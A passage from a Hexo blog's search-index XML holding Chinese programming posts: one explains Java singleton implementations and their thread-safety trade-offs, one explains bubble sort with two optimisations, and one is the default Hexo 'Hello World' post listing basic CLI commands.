      <link href="2021/03/07/%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>2021/03/07/%E5%8D%95%E4%BE%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h3 id="为什么会有单列设计模式？"><a href="#为什么会有单列设计模式？" class="headerlink" title="为什么会有单列设计模式？"></a>为什么会有单列设计模式？</h3><p>当应用程序中创建了多个实例时可能会造成资源的浪费。并且多次调用多个实例操作数据时容易造成结果错误。而单例模式能保证应用程序中有且只有一个实例。可以保证一个类在内存中的对象的唯一性，在一些常用的工具类、线程池、缓存、数据库等程序中可能只允许我们创建一个对象。</p><h3 id="单例模式的设计思想"><a href="#单例模式的设计思想" class="headerlink" title="单例模式的设计思想"></a>单例模式的设计思想</h3><p>单例模式的关键在于保证应用程序中有且仅有一个对象，如何保证只有一个对象呢？其实只需要三步就可以保证对象的唯一性：</p><p>（1）不允许其他类new对象</p><p>（2）在本类中创建对象</p><p>（3）对外提供一个可以让其他类获取该对象方法</p><p>将上面步骤转化为代码描述为：</p><p>（1）私有化本类的构造方法</p><p>（2）通过new关键字在本类中创建一个本类对象</p><p>（3）定义一个公有方法，将在本类中创建的对象返回</p><h3 id="单例模式的java代码实现："><a href="#单例模式的java代码实现：" class="headerlink" title="单例模式的java代码实现："></a>单例模式的java代码实现：</h3><p>单例模式可以分为两大类：饿汉式、懒汉式。</p><p>饿汉式和懒汉式的区别：</p><ul><li><p>饿汉式：指全局的单例实例在类装载时构建。</p></li><li><p>懒汉式：指全局的单例实例在第一次被使用时构建。</p></li></ul><p>单例模式的写法大致可以分为5类：懒汉式、饿汉式、双重校验锁、静态内部类、枚举。</p><h4 id="单例模式的饿汉式（可用）"><a href="#单例模式的饿汉式（可用）" class="headerlink" title="单例模式的饿汉式（可用）"></a>单例模式的饿汉式（可用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getSingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">Singleton singleton = Singleton.getSingleton();</span><br></pre></td></tr></table></figure><p>优点：</p><p>实现简单，在类加载时就完成了实例化，避免了线程同步问题。</p><p>缺点：</p><p>由于在类加载时就完成实例化，所以没有达到（Lazy Loading）懒加载的效果，也就是说可能我没有用到这个实例它也会创建，会造成内存浪费（但是这个浪费可以忽略，所以也是推荐使用的）。</p><h4 id="单例模式的饿汉式变换写法（可用）"><a href="#单例模式的饿汉式变换写法（可用）" class="headerlink" title="单例模式的饿汉式变换写法（可用）"></a>单例模式的饿汉式变换写法（可用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton singleton = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getSingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">Singleton singleton = Singleton.getSingleton();</span><br></pre></td></tr></table></figure><p>其实这种写法和上一种写法一样，都是在类初始化时创建对象的，它的优缺点和上面一样，只是写法有点不同，可以归为一种写法。</p><h4 id="单例模式的懒汉式（线程不安全，不可用）"><a href="#单例模式的懒汉式（线程不安全，不可用）" class="headerlink" title="单例模式的懒汉式（线程不安全，不可用）"></a>单例模式的懒汉式（线程不安全，不可用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton singleton = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getSingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(singleton == <span class="keyword">null</span>)&#123;</span><br><span class="line">           singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">Singleton singleton = Singleton.getSingleton();</span><br></pre></td></tr></table></figure><p>这种方式是在调用getSingleton()方法时才创建对象，它相对于饿汉式比较懒，因此被称为懒汉式。</p><p>上述这种写法其实是存在线程安全问题的，那为什么会存在线程安全问题呢？</p><p>是因为在运行过程中可能会存在这么一种情况：当有多个线程去调用getSingleton()方法来获取Singleton的实例时，第一个线程在执行if(singleton == null)这个语句时，此时singleton 是为null，进入语句。在还没有执行singleton = new Singleton()时（此时singleton还是为null的）第二个线程也进入if(singleton == null)这个语句，因为第一个线程还没有执行singleton = new Singleton()，所以它会继续执行singleton = new Singleton()语句来实例化Singleton对象，因为第二个线程也进入了if语句，所以它也会实例化一个Singleton对象。这样就导致实例化了两个Singleton对象。所以它是存在线程安全的。</p><h4 id="线程安全的懒汉式（线程安全，效率低不推荐使用）"><a href="#线程安全的懒汉式（线程安全，效率低不推荐使用）" class="headerlink" title="线程安全的懒汉式（线程安全，效率低不推荐使用）"></a>线程安全的懒汉式（线程安全，效率低不推荐使用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton singleton = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Singleton <span class="title">getSingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(singleton == <span class="keyword">null</span>)&#123;</span><br><span class="line">           singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">Singleton singleton = Singleton.getSingleton();</span><br></pre></td></tr></table></figure><p>虽然通过加锁的方式解决了上面一种写法的线程安全问题，但是效率低。</p><p>缺点：</p><p>效率低，每个线程想要获得Singleton对象的时候，执行getSingleton()方法都要进行同步。而其实这个方法只需要执行一次实例化代码就够了，后面想要获得Singleton对象，直接return就行了。方法进行同步效率太低需要改进。</p><h4 id="单例模式的懒汉式（线程不安全，不可用）-1"><a href="#单例模式的懒汉式（线程不安全，不可用）-1" class="headerlink" title="单例模式的懒汉式（线程不安全，不可用）"></a>单例模式的懒汉式（线程不安全，不可用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton singleton = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getSingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(singleton == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class)&#123;</span><br><span class="line">                singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">Singleton singleton = Singleton.getSingleton();</span><br></pre></td></tr></table></figure><p>由于上面一种写法效率太低，可能有人会想到这种写法。其实这种写法跟（3）的写法一样是线程不安全的。当一个线程还没有实例化Singleton时，另一个线程执行到if(singleton == null)语句时就会进入到if语句，虽然加了锁，但等到第一个线程执行完singleton = new Singleton()跳出这个锁时，另一个已经进入if语句的线程同样会实例化一个新的Singleton对象。线程不安全的原理跟（3）中的类似，因此这种方法并不可行。</p><h4 id="单例模式懒汉式双重校验锁（推荐使用）"><a href="#单例模式懒汉式双重校验锁（推荐使用）" class="headerlink" title="单例模式懒汉式双重校验锁（推荐使用）"></a>单例模式懒汉式双重校验锁（推荐使用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton singleton = <span class="keyword">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getSingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(singleton == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class)&#123;</span><br><span class="line">                <span class="keyword">if</span>(singleton == <span class="keyword">null</span>)&#123;</span><br><span class="line">                    singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">Singleton singleton = Singleton.getSingleton();</span><br></pre></td></tr></table></figure><p>这一版代码解决了（3）和（4）中存在的问题，其中有两次if(singleton == null)的判断，这个叫做【双重检查 Double-Check】。</p><ul><li><p>第一个if(singleton == null)，其实是为了解决（4）中效率问题，只有singleton为null时，才进入synchronized的代码段。</p></li><li><p>第二个if(singleton == null)则是为了解决（3）中的线程安全问题，防止多线程可能实例多个对象的情况。</p></li></ul><p>volatile关键字是为了防止指令重排出现错误，就是说，由于有一个singleton不为null了，但是仍没有完成初始化的中间态，而这个时候，如果有其他线程刚好运行到第一层if语句，这里读取的singleton已经不为null了，所以直接把这个中间态的singleton拿去用，就会产生问题。（涉及原子操作、指令重排知识，volatile关键字的一个作用是禁止指令重排）</p><p>优点：</p><p>线程安全；延迟加载；效率较高</p><h4 id="内部类（推荐使用）"><a href="#内部类（推荐使用）" class="headerlink" title="内部类（推荐使用）"></a>内部类（推荐使用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SingletonHolder</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton singleton = <span class="keyword">new</span> Singleton();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> Singleton <span class="title">getSingleton</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> SingletonHolder.singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">Singleton singleton = Singleton.getSingleton();</span><br></pre></td></tr></table></figure><p>它利用了ClassLoader来保证了同步，同时又能让开发者控制类加载的时机。从内部看是一个饿汉式的单例，但从外部看又的确是懒汉式实现</p><p>优点：</p><p>避免了线程不安全；延迟加载；效率高。</p><h4 id="枚举（极推荐使用）"><a href="#枚举（极推荐使用）" class="headerlink" title="枚举（极推荐使用）"></a>枚举（极推荐使用）</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">enum</span> <span class="title">SingletonEnum</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    singleton;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">SingletonEnum</span><span class="params">()</span></span>&#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">method</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//do something</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//访问方式</span></span><br><span class="line">SingletonEnum.singleton.method();</span><br></pre></td></tr></table></figure><p>由于创建枚举实例的过程是线程安全的，所以这种写法也没有同步的问题。</p><p>优点：</p><p>这种写法在功能上与共有域方法相近，但它更简洁，无偿地提供了序列化机制，绝对防止对此实例化，即使是在面对复杂的序列化或者反射攻击的时候。</p><hr><p><strong>如有错误欢迎指出</strong>！</p><hr>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>冒泡排序</title>
      <link href="2021/03/04/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/"/>
      <url>2021/03/04/%E5%86%92%E6%B3%A1%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="一、冒泡排序"><a href="#一、冒泡排序" class="headerlink" title="一、冒泡排序"></a>一、冒泡排序</h2><hr><h3 id="1、什么是冒泡排序？"><a href="#1、什么是冒泡排序？" class="headerlink" title="1、什么是冒泡排序？"></a>1、什么是冒泡排序？</h3><p>&ensp;&ensp;&ensp;&ensp;我们把相邻的元素进行两两比较，根据大小来交换元素的位置。</p><p>&ensp;&ensp;&ensp;&ensp;原始的冒泡排序是稳定排序，由于该排序算法的每一轮都要遍历所有元素，轮转的次数和元素数量相当，所以时间复杂度是O（N^2）</p><hr><h3 id="2、java代码实现及优化："><a href="#2、java代码实现及优化：" class="headerlink" title="2、java代码实现及优化："></a>2、java代码实现及优化：</h3><h4 id="（1）原始的冒泡排序："><a href="#（1）原始的冒泡排序：" class="headerlink" title="（1）原始的冒泡排序："></a>（1）原始的冒泡排序：</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> array[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; array.length-i-<span class="number">1</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[j] &gt; array[j+<span class="number">1</span>])&#123;</span><br><span class="line">                tmp = array[j];</span><br><span class="line">                array[j] = array[j+<span class="number">1</span>];</span><br><span class="line">                array[j+<span class="number">1</span>] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    sort(array);</span><br><span class="line">    System.out.println(Arrays.toString(array));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="（2）冒泡排序优化一："><a href="#（2）冒泡排序优化一：" class="headerlink" title="（2）冒泡排序优化一："></a>（2）冒泡排序优化一：</h4><p>&ensp;&ensp;&ensp;&ensp;从上一版代码可以很明显看出，自从经过第六轮排序，整个数列已然是有序的了。但是排序算法仍然继续执行第七轮、第八轮。这种情况下，如果我们能判断出数列已经有序，并且做出标记，剩下的几轮排序就可以不必执行，提早结束工作。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> array[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++)&#123;</span><br><span class="line">        <span class="comment">//有序标记，判断数组是否有序，初始值为true（true表示有序，false表示无序）</span></span><br><span class="line">        <span class="keyword">boolean</span> isSorted = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; array.length-i-<span class="number">1</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[j] &gt; array[j+<span class="number">1</span>])&#123;</span><br><span class="line">                tmp = array[j];</span><br><span class="line">                array[j] = array[j+<span class="number">1</span>];</span><br><span class="line">                array[j+<span class="number">1</span>] = tmp;</span><br><span class="line">                <span class="comment">//有元素交换，所以不是有序，标记变为false</span></span><br><span class="line">                isSorted = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果是有序数组，跳出循环</span></span><br><span class="line">        <span class="keyword">if</span>(isSorted)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">5</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>&#125;;</span><br><span class="line">    sort(array);</span><br><span class="line">    System.out.println(Arrays.toString(array));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp;&ensp;&ensp;&ensp;这一版代码利用布尔变量isSorted作为标记。如果在本轮排序中，元素有交换，则说明数列无序；如果没有元素交换，说明数列已然有序，直接跳出大循环。</p><hr><h4 id="（3）冒泡排序优化二："><a href="#（3）冒泡排序优化二：" class="headerlink" title="（3）冒泡排序优化二："></a>（3）冒泡排序优化二：</h4><p>&ensp;&ensp;&ensp;&ensp;按照上一版代码的逻辑，有序区的长度和排序的轮数是相等的。比如第一轮排序过后的有序区长度是1，第二轮排序过后的有序区长度是2，以此类推……。实际上，数列真正的有序区可能会大于这个长度，比如{3,4,2,1,5,6,7,8}数组的第二轮，后面5个元素实际都已经属于有序区。因此后面的许多次元素比较是没有意义的。</p><p>&ensp;&ensp;&ensp;&ensp;当对于{3,4,2,1,5,6,7,8}这种特殊数据时，后半部分{……,5,6,7,8}已经是有序的,因此可以通过对数列的有序区做界定，在每一轮排序的最后，记录下最后一次元素交换的位置，那个位置也就是无序数列的边界，再往后就是有序区了。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> array[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//记录最后一次交换的位置</span></span><br><span class="line">    <span class="keyword">int</span> lastExchangeIndex = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//无序数列的标记，每次只需比较到这里为止</span></span><br><span class="line">    <span class="keyword">int</span> sortBorder = array.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length; i++)&#123;</span><br><span class="line">        <span class="comment">//有序标记，判断数组是否有序，初始值为true（true表示有序，false表示无序）</span></span><br><span class="line">        <span class="keyword">boolean</span> isSorted = <span class="keyword">true</span>;</span><br><span class="line">        <span class="comment">//只比较到无序数列边界</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; sortBorder; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[j] &gt; array[j+<span class="number">1</span>])&#123;</span><br><span class="line">                tmp = array[j];</span><br><span class="line">                array[j] = array[j+<span class="number">1</span>];</span><br><span class="line">                array[j+<span class="number">1</span>] = tmp;</span><br><span class="line">                <span class="comment">//有元素交换，所以不是有序，标记变为false</span></span><br><span class="line">                isSorted = <span class="keyword">false</span>;</span><br><span class="line">                <span class="comment">//记录最后一次交换的位置</span></span><br><span class="line">                lastExchangeIndex = j;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//把无序数列的边界更新为最后一次交换元素的位置</span></span><br><span class="line">        sortBorder = lastExchangeIndex;</span><br><span class="line">        <span class="comment">//如果是有序数组，跳出循环</span></span><br><span class="line">        <span class="keyword">if</span>(isSorted)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] array = <span class="keyword">new</span> <span class="keyword">int</span>[] &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;;</span><br><span class="line">    sort(array);</span><br><span class="line">    System.out.println(Arrays.toString(array));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&ensp;&ensp;&ensp;&ensp;这一版代码中，sortBorder就是无序数列的边界。每一轮排序过程中，sortBorder之后的元素就完全不需要比较了，肯定是有序的。</p><hr><p><strong>&ensp;&ensp;&ensp;&ensp;如有错误欢迎留言！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 排序算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 排序算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="2021/01/20/hello-world/"/>
      <url>2021/01/20/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
